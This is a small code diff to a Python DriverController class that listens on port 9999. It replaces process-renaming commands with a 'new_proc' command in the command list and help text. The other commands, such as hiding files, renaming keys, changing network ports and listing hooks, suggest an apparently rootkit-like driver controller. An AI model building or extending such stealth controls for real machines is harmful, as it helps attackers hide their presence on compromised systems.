@@ -9,7 +9,7 @@ class DriverController:
         self._host = host or '0.0.0.0'
         self._port = port or 9999
         self._available_commands = (
-            "0x97", "rpid", "rname", "hfile", "key", "net_src", "net_dst", "kb"
+            "0x97", "new_proc", "hfile", "key", "net_src", "net_dst", "kb"
         )
         self._commands_with_result = (
             "pids", "hooks"
@@ -68,8 +68,7 @@ class DriverController:
     @staticmethod
     def help():
         print(r"""
-        rename process for pid: rpid <%d> <%s>
-        rename process for name: rname <%s> <%s>
+        create new process: new_proc <%d> <%s>
         rename key: key <%s> <%s>
         change port src: net_src <%d> <%d>
         change port dst: net_dst <%d> <%d>
